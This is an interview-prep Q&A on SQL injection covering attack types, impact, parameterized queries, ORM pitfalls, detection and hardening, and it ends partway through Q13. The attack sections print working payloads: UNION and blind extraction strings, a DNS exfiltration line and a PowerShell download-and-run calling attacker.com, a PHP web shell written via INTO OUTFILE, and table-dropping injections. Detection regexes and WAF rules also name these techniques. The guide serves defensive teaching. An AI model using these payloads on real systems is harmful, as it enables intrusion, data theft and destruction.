# Security: SQL Injection — Interview Q&A (5 YOE Level)

## Section 1: Fundamentals and Attack Mechanics

**Q1. What is SQL injection, and why does it exist as a vulnerability class?**
A: SQL injection (SQLi) is a code injection attack where attacker-controlled input is interpreted as SQL syntax rather than data, allowing the attacker to alter the query's logic. It exists because of a fundamental design mistake: constructing SQL queries by concatenating strings — where user input and SQL keywords occupy the same string — without any mechanism to distinguish data from syntax.

The underlying cause is a parsing ambiguity. When a database engine receives a query string, it cannot distinguish between SQL keywords the developer intended and SQL keywords that arrived via user input. If user input is embedded raw into the query string, the parser treats all of it as SQL. The attacker's goal is to inject SQL metacharacters (quotes, semicolons, comment markers, operators) that alter the parse tree of the query.

The canonical example:

```python
# Vulnerable — string concatenation
username = request.form["username"]  # attacker provides: admin'--
query    = f"SELECT * FROM users WHERE username = '{username}'"

# Resulting SQL the database receives:
# SELECT * FROM users WHERE username = 'admin'--'
#
# Parser sees:
#   SELECT * FROM users WHERE username = 'admin'
#   -- (comment — everything after this is ignored)
#
# The password check that follows in application logic never runs.
# If username 'admin' exists, authentication is bypassed.
```

The reason this vulnerability class persists despite being 25+ years old:
- Legacy codebases predate ORM adoption.
- Developers learn SQL by string formatting before learning parameterization.
- Dynamic query construction (variable table names, ORDER BY columns, dynamic WHERE clauses) tempts even experienced developers to fall back to concatenation.
- Raw SQL in ORMs (`.raw()`, `execute()`) reintroduces the vulnerability even in otherwise-protected codebases.

**Q2. What are the main categories of SQL injection, and how does each work?**
A: SQL injection variants differ in how the attacker extracts information or causes damage:

**In-band SQLi — error-based:**
The database error message is returned to the attacker, revealing schema information.

```sql
-- Input: ' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
-- SQL Server error: Conversion failed when converting the nvarchar value 'users' to int
-- Attacker learns the table name 'users' from the error message
```

**In-band SQLi — union-based:**
A UNION SELECT appends attacker-controlled rows to the legitimate query result.

```sql
-- Original query (products search):
SELECT id, name, price FROM products WHERE category = '[input]'

-- Input: ' UNION SELECT username, password, 3 FROM users--
-- Resulting query:
SELECT id, name, price FROM products WHERE category = ''
UNION SELECT username, password, 3 FROM users--'

-- The response renders product rows AND user credential rows
-- attacker sees usernames and (hashed) passwords in the product listing
```

Requirements: the UNION query must have the same column count and compatible types as the original. Attackers determine column count by incrementally adding NULL columns until the error disappears.

**Blind SQLi — boolean-based:**
No data is returned directly, but the application behaves differently for true vs false conditions. The attacker extracts data one bit at a time.

```sql
-- Target: does the first character of the admin password hash start with 'a'?
-- Input (true condition):
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--

-- If the page loads normally → condition is TRUE → first char is 'a'
-- If the page returns an error or different response → condition is FALSE → try next char

-- Automated with sqlmap or custom scripts:
-- 'a', 'b', 'c'... until TRUE found → move to second character
-- Extracts the full hash character by character
-- Slow (minutes to hours for a full dump) but reliable
```

**Blind SQLi — time-based:**
When the application returns the same response regardless of the query result (no boolean difference), the attacker uses time delays as the signal.

```sql
-- MySQL: if the condition is true, sleep 5 seconds
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--

-- PostgreSQL equivalent:
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--

-- SQL Server:
' AND IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--

-- Attacker measures response time: >5s = TRUE, <1s = FALSE
-- Extracts data via timing oracle — works even on pages that return no visible output
```

**Out-of-band SQLi:**
Data is exfiltrated via a separate channel (DNS lookup, HTTP request) triggered by database functionality. Used when in-band and blind approaches are unreliable.

```sql
-- SQL Server: xp_cmdshell or DNS exfiltration
'; EXEC master..xp_cmdshell 'nslookup ' + (SELECT password FROM users WHERE username='admin') + '.attacker.com'--

-- The DNS query for '<password_hash>.attacker.com' is logged at attacker.com
-- Attacker reads the exfiltrated data from their DNS logs
-- Works even when the HTTP response returns nothing useful
```

**Second-order SQLi:**
Input is stored safely (escaped or parameterized) on the way in, but later retrieved and used unsafely in a different query. The injection fires at the point of retrieval, not insertion.

```python
# Safe insertion — username stored correctly in the database
db.execute("INSERT INTO users (username) VALUES (%s)", (username,))
# username "admin'--" is stored verbatim in the DB

# Later — vulnerable retrieval and reuse:
stored_username = db.fetchone("SELECT username FROM users WHERE id = %s", (user_id,))
# stored_username is now: admin'--   (raw string from DB)

# Developer assumes data from the DB is safe:
db.execute(f"SELECT * FROM profiles WHERE username = '{stored_username}'")
# Resulting query: SELECT * FROM profiles WHERE username = 'admin'--'
# Injection fires here, not at insertion
```

Second-order is particularly insidious because it defeats input sanitization at insertion time — the sanitization layer never sees the second query.

**Q3. What is the actual impact of a successful SQL injection? Give concrete examples.**
A: Impact ranges from data exposure to full server compromise, depending on database configuration and the query context:

**Authentication bypass:**
```sql
-- Login query: SELECT * FROM users WHERE username='[u]' AND password='[p]'
-- Input username: admin'--   password: anything
-- Effective query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check commented out → logged in as admin with no valid credentials
```

**Full database dump:**
```sql
-- UNION-based exfiltration of all tables:
' UNION SELECT table_name, column_name, 3 FROM information_schema.columns--
-- Then: dump specific tables of interest (users, credit_cards, api_keys, audit_logs)
```

**Data modification:**
```sql
-- Injected UPDATE — change another user's password, balance, permissions:
'; UPDATE users SET password='attacker_hash' WHERE username='admin'--
'; UPDATE accounts SET balance = balance + 1000000 WHERE account_id = 'ATTACKER_ACC'--
```

**Data deletion:**
```sql
'; DELETE FROM transactions WHERE 1=1--   ← deletes all transactions
'; DROP TABLE users--                       ← destroys the users table (if privileges allow)
```

**File system access (MySQL with FILE privilege, SQL Server with xp_cmdshell):**
```sql
-- MySQL: read files from the filesystem
' UNION SELECT LOAD_FILE('/etc/passwd'), 2, 3--

-- MySQL: write a web shell (if web root is writable):
' UNION SELECT '<?php system($_GET["cmd"]); ?>', 2, 3 INTO OUTFILE '/var/www/html/shell.php'--

-- SQL Server: OS command execution via xp_cmdshell:
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'--
```

**Privilege escalation chain:**
SQLi → read `/etc/passwd` and SSH keys → SSH into server → escalate to root → compromise entire infrastructure. A single SQLi vulnerability in a fintech application can chain to full infrastructure takeover. This is why SQL injection has been in the OWASP Top 10 every year since 2003 and remains the most severe web vulnerability class by impact.

## Section 2: Parameterized Queries

**Q4. What is a parameterized query, and why does it completely prevent SQL injection?**
A: A parameterized query (also called a prepared statement) separates the SQL structure from the data. The query template with placeholders (`?`, `%s`, `$1`) is sent to the database engine first, where it is parsed, compiled, and an execution plan is built. The parameter values are then sent separately as data — they are bound into the already-compiled plan, not concatenated into the SQL string.

The prevention is structural, not escaping-based:

```
String concatenation (vulnerable):
  Developer writes: "SELECT * FROM users WHERE id = " + user_input
  Database receives: "SELECT * FROM users WHERE id = 1 OR 1=1"
  Database parses:  SELECT ... WHERE id = 1 OR 1=1  ← attacker altered the AST

Parameterized query (safe):
  Developer writes: "SELECT * FROM users WHERE id = ?" with parameter [user_input]
  Database receives: parse "SELECT * FROM users WHERE id = ?" → builds execution plan
  Database receives: bind parameter "1 OR 1=1" → treated as the literal string "1 OR 1=1"
  Database executes: SELECT * FROM users WHERE id = '1 OR 1=1'
                     → no rows match (id is an integer, "1 OR 1=1" is not)
                     → the OR 1=1 is data, not SQL syntax — the AST is already locked
```

The critical property: once the query template is compiled, the parse tree is fixed. Parameter values are bound after parsing — they cannot alter the query's syntax tree regardless of their content. A value containing `'; DROP TABLE users--` is bound as a string literal, not parsed as SQL.

```python
# Python — psycopg2 (PostgreSQL)
import psycopg2

conn   = psycopg2.connect(DATABASE_URL)
cursor = conn.cursor()

# WRONG — string interpolation, vulnerable to SQLi
user_id = request.args.get("id")
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")  # NEVER DO THIS

# CORRECT — parameterized, %s is psycopg2's placeholder (not string formatting)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
# Note the tuple — always pass parameters as the second argument, not in the query string
rows = cursor.fetchall()

# Multi-parameter example
cursor.execute(
    "SELECT * FROM transactions WHERE user_id = %s AND amount > %s AND created_at > %s",
    (user_id, min_amount, start_date)
)
```

```javascript
// Node.js — pg (node-postgres)
const { Pool } = require("pg");
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// WRONG
const userId = req.query.id;
pool.query(`SELECT * FROM users WHERE id = ${userId}`);  // vulnerable

// CORRECT — $1, $2, ... are PostgreSQL positional placeholders
const result = await pool.query(
    "SELECT id, email, role FROM users WHERE id = $1 AND active = $2",
    [userId, true]
);

// Named parameters in some drivers (node-postgres doesn't support named, but others do)
// mysql2 supports ? placeholders:
const [rows] = await db.execute(
    "SELECT * FROM accounts WHERE user_id = ? AND status = ?",
    [userId, "active"]
);
```

```go
// Go — database/sql
import "database/sql"

// WRONG
query := fmt.Sprintf("SELECT * FROM users WHERE email = '%s'", email)
db.Query(query)  // vulnerable

// CORRECT — ? placeholder (MySQL/SQLite) or $1 (PostgreSQL with pgx)
row := db.QueryRow("SELECT id, role FROM users WHERE email = ? AND active = ?", email, true)

// PostgreSQL with pgx driver
row := db.QueryRow(ctx, "SELECT id, role FROM users WHERE email = $1", email)
```

**Q5. What is the difference between parameterized queries and string escaping, and why is escaping insufficient?**
A: String escaping (sanitization) transforms dangerous characters before inserting them into the query string: `'` becomes `\'`, `"` becomes `\"`, etc. It operates on the final string before it reaches the database. Parameterized queries prevent injection at the architectural level — data never enters the SQL parsing pipeline at all.

Escaping is insufficient for five reasons:

**1. Character set and encoding attacks:**
```python
# Multibyte encoding bypass — GBK encoding (historic MySQL vulnerability)
# The byte sequence 0xbf27 is a valid GBK two-byte character
# When PHP's addslashes escapes 0x27 (') to 0x5c27 (\')
# the resulting 0xbf5c is interpreted as the GBK character 縗
# and the 0x27 is freed — the quote becomes unescaped
input = b"\xbf\x27 OR 1=1--"
escaped = addslashes(input)  # becomes 0xbf 0x5c 0x27 OR 1=1--
# MySQL in GBK mode: reads 0xbf5c as one character (縗), then 0x27 is a free quote
# Injection succeeds despite escaping
```

**2. Context-dependent escaping failures:**
Escaping for string contexts does not protect numeric, identifier, or other contexts:
```sql
-- Numeric context — no quotes to escape:
SELECT * FROM products ORDER BY [user_input]
-- Input: 1; DROP TABLE products
-- Escaping does nothing — there are no quotes to escape
-- The semicolon and DROP are not quote characters

-- Identifier context (table/column names):
SELECT * FROM [user_input_table]
-- Input: users; DROP TABLE users--
-- Quote-escaping doesn't protect identifiers
```

**3. Escaping function misapplication:**
Using an escaping function designed for one context in a different context:
```php
// PHP: mysql_real_escape_string escapes for string literals inside quotes
// Developer forgets the quotes:
$query = "SELECT * FROM users WHERE id = " . mysql_real_escape_string($id);
// Input: 1 OR 1=1
// mysql_real_escape_string does nothing (no special chars) → injection succeeds
// The function escaped correctly, but the context requires quotes it doesn't provide
```

**4. Double-encoding:**
```
Input:    %27 (URL-encoded single quote)
After URL decode: '    (single quote — injection character)
After escaping:   \'   (escaped)

But: input %2527 (double-encoded)
After URL decode: %27  (not decoded again by URL decode)
After escaping:   %27  (no special chars to escape)
Application logic then decodes %27 → ' (unescaped, injection succeeds)
```

**5. Second-order injection:**
Data escaped on insertion is stored raw. When retrieved and reused in a new query, there is no escaping on the second query. Parameterized queries on both the insert and the select protect both operations independently — escaping only at insert doesn't protect the subsequent query.

Parameterized queries are immune to all of these because the escape function is the wrong abstraction — it treats symptoms (dangerous characters) rather than the cause (mixing data and SQL syntax in a single string).

**Q6. Are there SQL constructs that cannot be parameterized, and how do you handle them safely?**
A: Yes. Parameterized queries handle literal values (strings, numbers, dates, booleans). They cannot parameterize SQL structural elements:

- **Table names** — `SELECT * FROM ?` is not valid SQL
- **Column names** — `SELECT ? FROM users` treats the column name as a string literal
- **ORDER BY direction** — `ORDER BY column ?` does not work
- **IN clauses with dynamic counts** — `WHERE id IN (?, ?)` requires knowing the count at parse time (or using workarounds)
- **Identifiers generally** — schema names, function names, operators

For these, the correct approach is **allowlisting** — validate the dynamic element against a known-safe list before interpolating it into the query:

```python
# ORDER BY with user-specified column — allowlist approach
ALLOWED_SORT_COLUMNS = {"created_at", "amount", "status", "user_id"}
ALLOWED_SORT_DIRS    = {"ASC", "DESC"}

def get_transactions(sort_col: str, sort_dir: str, user_id: int):
    # Validate against allowlist — raise if not found
    if sort_col not in ALLOWED_SORT_COLUMNS:
        raise ValueError(f"Invalid sort column: {sort_col!r}")
    if sort_dir.upper() not in ALLOWED_SORT_DIRS:
        raise ValueError(f"Invalid sort direction: {sort_dir!r}")

    # Now safe to interpolate — these values can only be known-safe strings
    query = f"""
        SELECT id, amount, status, created_at
        FROM   transactions
        WHERE  user_id = %s
        ORDER BY {sort_col} {sort_dir.upper()}
    """
    cursor.execute(query, (user_id,))
    return cursor.fetchall()
```

```python
# Dynamic IN clause — build the placeholder list programmatically
def get_users_by_ids(user_ids: list[int]) -> list:
    if not user_ids:
        return []
    # Validate types — ensure all elements are integers before building the query
    if not all(isinstance(uid, int) for uid in user_ids):
        raise ValueError("All user IDs must be integers")

    placeholders = ", ".join(["%s"] * len(user_ids))  # generates: %s, %s, %s
    query = f"SELECT id, email FROM users WHERE id IN ({placeholders})"
    cursor.execute(query, tuple(user_ids))
    return cursor.fetchall()

# PostgreSQL alternative — use ANY with an array parameter (cleaner):
cursor.execute("SELECT id, email FROM users WHERE id = ANY(%s)", (user_ids,))
```

```python
# Table name selection — map from user-controlled key to actual table name
TABLE_MAP = {
    "transactions": "financial_transactions",
    "accounts":     "user_accounts",
    "profiles":     "user_profiles",
}

def query_table(table_key: str, user_id: int):
    table_name = TABLE_MAP.get(table_key)
    if table_name is None:
        raise ValueError(f"Unknown table key: {table_key!r}")
    # table_name is now a known safe identifier from our own map
    cursor.execute(f"SELECT * FROM {table_name} WHERE user_id = %s", (user_id,))
```

The rule: **parameterize values, allowlist identifiers, never trust user input directly in either position without validation**.

## Section 3: ORM Protection and Pitfalls

**Q7. How do ORMs prevent SQL injection, and what is the mechanism underneath?**
A: ORMs (SQLAlchemy, Django ORM, Hibernate, Sequelize, GORM, Prisma) generate parameterized queries from their query builder API. When you express a query through the ORM's method chain, the ORM constructs the SQL template and collects parameter values separately — the generated SQL always uses placeholders:

```python
# SQLAlchemy Core — ORM generates: SELECT * FROM users WHERE email = $1 AND active = $2
from sqlalchemy import select

stmt = (
    select(User)
    .where(User.email == user_input_email)   # == generates a parameterized predicate
    .where(User.active == True)
)
result = session.execute(stmt)
# Internally: session.execute("SELECT ... WHERE email = %s AND active = %s", (email, True))
# user_input_email is always a parameter, never concatenated into the SQL string
```

```python
# Django ORM
users = User.objects.filter(
    email=user_input_email,   # generates WHERE email = %s
    active=True,
    created_at__gte=start_date,
)
# SQL: SELECT ... FROM users WHERE email = %s AND active = %s AND created_at >= %s
# Parameters: (user_input_email, True, start_date)
```

```typescript
// Prisma (TypeScript)
const users = await prisma.user.findMany({
    where: {
        email: userInputEmail,    // always parameterized
        active: true,
    },
});
// Generated: SELECT * FROM "User" WHERE email = $1 AND active = $2
// Parameters: [userInputEmail, true]
```

```go
// GORM
var users []User
db.Where("email = ? AND active = ?", userInputEmail, true).Find(&users)
// Generates parameterized query — the ? placeholders are bound separately
```

The ORM is safe by default because the query builder API doesn't accept raw SQL in value positions — it only accepts typed Go/Python/TypeScript values, which it knows to bind as parameters.

**Q8. What are the ORM escape hatches that reintroduce SQL injection, and how do you use them safely?**
A: Every major ORM provides a mechanism to execute raw SQL — necessary for complex queries the ORM builder can't express. These are the primary sources of SQLi in ORM-heavy codebases.

**Django — `raw()` and `extra()`:**
```python
# VULNERABLE — string formatting into .raw()
user_id = request.GET.get("id")
users = User.objects.raw(f"SELECT * FROM users WHERE id = {user_id}")

# VULNERABLE — extra() with string interpolation
User.objects.extra(where=[f"status = '{user_status}'"])

# CORRECT — .raw() with params argument
users = User.objects.raw(
    "SELECT * FROM users WHERE id = %s AND active = %s",
    [user_id, True]   # params are passed separately, bound as parameters
)

# CORRECT — RawSQL expression (for .annotate() and .filter())
from django.db.models.expressions import RawSQL
User.objects.annotate(
    score=RawSQL("SELECT score FROM user_scores WHERE user_id = %s", (user_id,))
)

# CORRECT — connection.execute() with params
from django.db import connection
with connection.cursor() as cursor:
    cursor.execute(
        "SELECT id, email FROM users WHERE tenant_id = %s AND role = %s",
        [tenant_id, role]
    )
    rows = cursor.fetchall()
```

**SQLAlchemy — `text()` and `execute()`:**
```python
from sqlalchemy import text

# VULNERABLE — f-string into text()
stmt = text(f"SELECT * FROM users WHERE email = '{user_email}'")
session.execute(stmt)

# CORRECT — text() with bindparams
stmt = text("SELECT * FROM users WHERE email = :email AND active = :active")
result = session.execute(stmt, {"email": user_email, "active": True})

# CORRECT — using bindparams() explicitly
stmt = text("SELECT * FROM transactions WHERE amount > :min_amount")
stmt = stmt.bindparams(min_amount=min_amount)
result = session.execute(stmt)

# VULNERABLE pattern to watch in code review — any text() without :named_params
# text("SELECT * FROM users WHERE id = " + str(user_id))  # injection
```

**Sequelize (Node.js):**
```javascript
// VULNERABLE — raw query with string interpolation
const userId = req.query.id;
await sequelize.query(`SELECT * FROM users WHERE id = ${userId}`);

// CORRECT — replacements (positional)
await sequelize.query(
    "SELECT * FROM users WHERE id = ? AND active = ?",
    { replacements: [userId, true], type: QueryTypes.SELECT }
);

// CORRECT — named replacements
await sequelize.query(
    "SELECT * FROM users WHERE id = :userId AND active = :active",
    { replacements: { userId, active: true }, type: QueryTypes.SELECT }
);

// VULNERABLE ORM method — literal() bypasses parameterization
User.findAll({ where: sequelize.literal(`id = ${userId}`) }); // injection

// CORRECT — where clause with operator
User.findAll({ where: { id: userId, active: true } });
```

**GORM (Go):**
```go
// VULNERABLE — string formatting into Where()
db.Where(fmt.Sprintf("email = '%s'", userEmail)).Find(&users)

// VULNERABLE — Raw() with string concatenation
db.Raw("SELECT * FROM users WHERE id = " + userId).Scan(&users)

// CORRECT — Where() with ? placeholders
db.Where("email = ? AND active = ?", userEmail, true).Find(&users)

// CORRECT — Raw() with ? placeholders
db.Raw("SELECT id, email FROM users WHERE id = ? AND role = ?", userId, role).Scan(&users)

// CORRECT — First/Find with struct conditions (fully safe)
db.Where(&User{Email: userEmail, Active: true}).Find(&users)
```

**Q9. How do you identify ORM-layer SQLi vulnerabilities in a code review?**
A: The patterns to search for in a code review, by language:

```bash
# Django — grep for injection-prone patterns
grep -rn "\.raw(" --include="*.py"        # every .raw() call needs manual review
grep -rn "\.extra(" --include="*.py"      # extra() is deprecated and dangerous
grep -rn "cursor\.execute(" --include="*.py"  # raw DB calls
grep -rn "% " --include="*.py" | grep -i "sql\|query\|select\|where"  # % formatting in queries
grep -rn 'f".*SELECT\|f".*WHERE\|f".*FROM' --include="*.py"  # f-strings in SQL

# SQLAlchemy
grep -rn "text(" --include="*.py" | grep -v "bindparams\|:param"  # text() without params
grep -rn "engine\.execute\|session\.execute" --include="*.py"       # raw executes

# Node.js / Sequelize
grep -rn "sequelize\.query" --include="*.js" --include="*.ts"  # raw queries
grep -rn "literal(" --include="*.js" --include="*.ts"          # Sequelize.literal()
grep -rn "\`SELECT\|\`INSERT\|\`UPDATE\|\`DELETE" --include="*.ts"  # template literals with SQL

# Go / GORM
grep -rn "\.Raw(" --include="*.go"      # raw SQL in GORM
grep -rn "db\.Exec(" --include="*.go"   # raw exec
grep -rn "Sprintf.*SELECT\|Sprintf.*WHERE" --include="*.go"  # fmt.Sprintf in queries

# Generic — any language
grep -rn "ORDER BY.*\+" --include="*.py" --include="*.js" --include="*.go"  # ORDER BY concatenation
```

Beyond grep, review patterns in context:

```python
# Pattern 1: Safe — parameter is a separate argument
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))   ✓

# Pattern 2: Unsafe — parameter is in the query string
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)     ✗
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")        ✗
cursor.execute("SELECT * FROM users WHERE id = " + user_id)        ✗

# Pattern 3: Requires inspection — raw() could be either
User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])  ✓
User.objects.raw(f"SELECT * FROM users WHERE id = {user_id}")      ✗

# Pattern 4: Always unsafe — text() without bind params
session.execute(text(f"SELECT * FROM users WHERE id = '{user_id}'"))  ✗

# Pattern 5: Subtle — ORM safe, but ORDER BY is interpolated
User.objects.filter(active=True).extra(order_by=[user_sort_field])    ✗ (if sort_field not allowlisted)
```

## Section 4: Detection

**Q10. How do you detect SQL injection vulnerabilities through automated scanning?**
A: Automated detection operates at multiple layers:

**Static Analysis (SAST) — finds vulnerabilities in source code before deployment:**

```yaml
# Semgrep rules for SQLi detection — runs in CI
# semgrep --config=p/sql-injection src/

# Example custom rule for Django:
rules:
  - id: django-raw-sql-injection
    patterns:
      - pattern: $MODEL.objects.raw(f"...{$VAR}...")
      - pattern: $MODEL.objects.raw("..." + $VAR + "...")
      - pattern: $MODEL.objects.raw("..." % $VAR)
    message: >
      Potential SQL injection via raw() with string interpolation.
      Use parameterized queries: .raw("... WHERE id = %s", [var])
    severity: ERROR
    languages: [python]

  - id: sqlalchemy-text-injection
    patterns:
      - pattern: text(f"...{$VAR}...")
      - pattern: text("..." + $VAR)
    message: >
      Potential SQL injection via text() without bind parameters.
      Use named parameters: text("WHERE id = :id").bindparams(id=var)
    severity: ERROR
    languages: [python]
```

Tools by language:
- **Python:** Bandit (`bandit -r src/ -t B608`), Semgrep (`p/sql-injection`), SonarQube
- **Java:** SpotBugs + FindSecBugs plugin, Checkmarx
- **Go:** gosec (`gosec -rule G201,G202 ./...`) — G201/G202 are SQLi rules
- **JavaScript/TypeScript:** ESLint with `eslint-plugin-security`, Semgrep
- **PHP:** PHPCS with Security ruleset, Psalm with taint analysis

SAST has high false-positive rates on complex codebases (it can't always trace data flow through function calls) but catches obvious concatenation patterns with zero runtime cost.

**Dynamic Analysis (DAST) — tests the running application:**

```bash
# sqlmap — the standard tool for SQLi detection and exploitation
# Basic scan — tests all parameters in the URL
sqlmap -u "https://app.myorg.com/api/products?category=electronics" \
       --level=3 --risk=2 --batch

# POST request with JSON body
sqlmap -u "https://app.myorg.com/api/users/search" \
       --data='{"query":"laptop"}' \
       --headers="Content-Type: application/json" \
       --headers="Authorization: Bearer $TOKEN" \
       --level=3 --risk=2

# Crawl the application and test all discovered parameters
sqlmap -u "https://app.myorg.com/" --crawl=3 --batch --level=5

# Test specific parameter only
sqlmap -u "https://app.myorg.com/api/users?id=1&role=admin" -p id

# sqlmap output interpretation:
# [INFO] GET parameter 'id' is 'Generic UNION query' injectable  ← confirmed SQLi
# [INFO] the back-end DBMS is PostgreSQL 14                      ← fingerprinted DB
# available databases: ['public', 'loans_db', 'audit_db']        ← enumerated schemas
```

**Taint analysis — tracks user input through the codebase:**
More sophisticated than pattern matching — traces the flow of user-controlled data from input sources (HTTP parameters, headers, cookies) to sink functions (SQL execution):

```
Taint source: request.GET["id"]  (user-controlled)
Data flows through:  format_query() → build_where_clause() → cursor.execute()
Taint sink: cursor.execute(query)  (SQL execution)
No parameterization in the flow → taint reaches the sink → reported as vulnerability
```

Tools: CodeQL (GitHub's static analysis, excellent taint tracking), Coverity, Checkmarx, Veracode. CodeQL is free for open-source projects:

```bash
# CodeQL query for Python SQL injection
# Finds user input that flows into SQL execution without parameterization
codeql database create mydb --language=python --source-root=src/
codeql query run queries/python/CWE-089/SqlInjection.ql --database=mydb
```

**Q11. How do you detect SQL injection attempts at runtime in a production system?**
A: Runtime detection operates on live traffic and database query logs. Multiple layers:

**WAF (Web Application Firewall) — blocks known payloads:**

```nginx
# ModSecurity (NGINX) — OWASP Core Rule Set (CRS) detects SQLi patterns
# /etc/nginx/modsecurity.conf
SecRuleEngine On
SecRule ARGS "@detectSQLi" \
    "id:942100,\
    phase:2,\
    deny,\
    status:403,\
    log,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}'"
```

WAF limitations: pattern-matching WAFs generate false positives (legitimate queries containing SQL keywords like "select" or "union") and can be bypassed by obfuscation (URL encoding, case variation, comment insertion). Use WAF as defense-in-depth, not as the primary protection.

**Database query logging and anomaly detection:**

```sql
-- PostgreSQL: enable query logging for slow or flagged queries
-- postgresql.conf:
log_min_duration_statement = 100   -- log queries taking >100ms (time-based blind SQLi generates slow queries)
log_statement = 'all'              -- log all statements (high volume, use carefully)
log_connections = on
log_disconnections = on

-- pg_stat_statements: track query patterns
SELECT query, calls, mean_exec_time, rows
FROM pg_stat_statements
WHERE query LIKE '%UNION%'          -- UNION-based injection patterns
   OR query LIKE '%information_schema%'  -- schema enumeration
   OR query LIKE '%pg_sleep%'       -- time-based blind injection
   OR query LIKE '%LOAD_FILE%'      -- file read attempts
ORDER BY calls DESC;
```

```python
# Application-level detection middleware — inspect queries before execution
import re, logging

SQLI_PATTERNS = [
    r"(\bUNION\b.*\bSELECT\b)",        # UNION-based
    r"(\bOR\b\s+\d+=\d+)",             # OR 1=1 tautology
    r"(--\s*$)",                        # comment termination
    r"(/\*.*\*/)",                      # block comment
    r"(\bINFORMATION_SCHEMA\b)",        # schema enumeration
    r"(\bpg_sleep\b|\bSLEEP\b|\bWAITFOR\b)",  # time-based blind
    r"(\bDROP\b|\bTRUNCATE\b|\bDELETE\b\s+\bFROM\b)",  # destructive ops
    r"(\bxp_cmdshell\b|\bLOAD_FILE\b|\bINTO OUTFILE\b)",  # OS access
]
COMPILED_PATTERNS = [re.compile(p, re.IGNORECASE) for p in SQLI_PATTERNS]

class SQLInjectionDetector:
    def inspect_input(self, value: str, field_name: str, request_id: str) -> None:
        for pattern in COMPILED_PATTERNS:
            if pattern.search(value):
                logging.warning(
                    "Potential SQLi detected",
                    extra={
                        "field":      field_name,
                        "pattern":    pattern.pattern,
                        "value":      value[:200],   # truncate long payloads
                        "request_id": request_id,
                        "event_type": "sqli_attempt",
                    }
                )
                # Don't block here — the parameterized query will handle it safely
                # Blocking on pattern match causes false positives
                # Use this for alerting and forensics, not for security enforcement
```

The key design decision: input inspection should **alert**, not **block**. The parameterized query is the security control — it will handle the injection attempt safely regardless. Pattern-matching to block is the wrong security model (bypass-prone). Pattern-matching to alert gives visibility into attack attempts without the false-positive risk of blocking.

**Q12. How do you detect a SQL injection vulnerability that is already exploited — post-compromise detection?**
A: Post-compromise SQLi detection combines database audit logs, application logs, and infrastructure monitoring:

**Indicators in database logs:**
```sql
-- PostgreSQL audit log (pgaudit extension) — look for:
-- 1. Anomalous query patterns from application DB users
SELECT * FROM pgaudit.log
WHERE command LIKE '%UNION SELECT%'
   OR command LIKE '%information_schema%'
   OR command LIKE '%pg_sleep%'
   OR command LIKE '%INTO OUTFILE%'
   AND username = 'app_user'   -- app user should never run these
ORDER BY log_time DESC;

-- 2. Unusual tables accessed by the app user
SELECT DISTINCT table_name
FROM pgaudit.log
WHERE username   = 'app_user'
  AND table_name NOT IN ('users','transactions','accounts','products')
  AND log_time    > NOW() - INTERVAL '7 days';

-- 3. Spike in query count — automated blind injection generates many queries
SELECT DATE_TRUNC('minute', log_time) AS minute, COUNT(*) AS query_count
FROM pgaudit.log
WHERE username = 'app_user'
GROUP BY minute
HAVING COUNT(*) > 1000   -- app normally executes <100 queries/minute
ORDER BY minute DESC;
```

**Indicators in application logs:**
```python
# HTTP response anomalies that suggest successful injection:
# 1. 200 responses with unusually large bodies (UNION dumped extra rows)
# 2. Intermittent 500 errors with database error messages in body (error-based)
# 3. Response time spikes correlating to specific parameters (time-based blind)
# 4. Repeated requests with incrementing ASCII values in a parameter (binary search)

# Example log analysis with Python:
import json
from collections import Counter

def analyze_access_logs(log_file: str):
    suspicious = []
    with open(log_file) as f:
        for line in f:
            entry = json.loads(line)
            params = entry.get("query_params", {})
            for key, value in params.items():
                for pattern in COMPILED_PATTERNS:
                    if pattern.search(str(value)):
                        suspicious.append({
                            "ip":         entry["remote_addr"],
                            "timestamp":  entry["time"],
                            "param":      key,
                            "value":      value[:200],
                            "status":     entry["status"],
                            "response_size": entry["body_bytes_sent"],
                        })

    # Group by IP — automated attacks come from one or few IPs
    ip_counts = Counter(s["ip"] for s in suspicious)
    print(f"Top attacking IPs: {ip_counts.most_common(10)}")
    return suspicious
```

**Network-level indicators:**
Time-based blind injection generates a distinctive traffic pattern: many requests with identical structure except one parameter that increments by one ASCII value, with response times clustering at 0ms or exactly at the sleep duration. This is detectable at the load balancer or API gateway level:

```
Request pattern from attacker IP 1.2.3.4 over 10 minutes:
  GET /api/users?id=1'+AND+SLEEP(5)--    response_time: 5002ms
  GET /api/users?id=1'+AND+SLEEP(5)--    response_time: 5001ms  ← consistent 5s delays
  GET /api/users?id=1'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+id=1)='a'+AND+SLEEP(5)--  5001ms
  GET /api/users?id=1'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+id=1)='b'+AND+SLEEP(0)--  3ms
  ... (character by character extraction)
```

Alert rule: IP with >20 requests where >50% have response times exactly matching a sleep duration → probable time-based blind injection.

## Section 5: Defense-in-Depth and Hardening

**Q13. Beyond parameterized queries, what additional layers of defense reduce SQL injection risk?**
A: Defense-in-depth means multiple independent controls — any one of which limits the impact even if another fails:

**1. Principle of least privilege for database users:**
```sql
-- Application database user — read/write only on specific tables, no DDL
CREATE USER app_user WITH PASSWORD '...';
GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE users, transactions, accounts TO app_user;
-- NOT GRANTED: DROP, CREATE, TRUNCATE, REFERENCES, TRIGGER
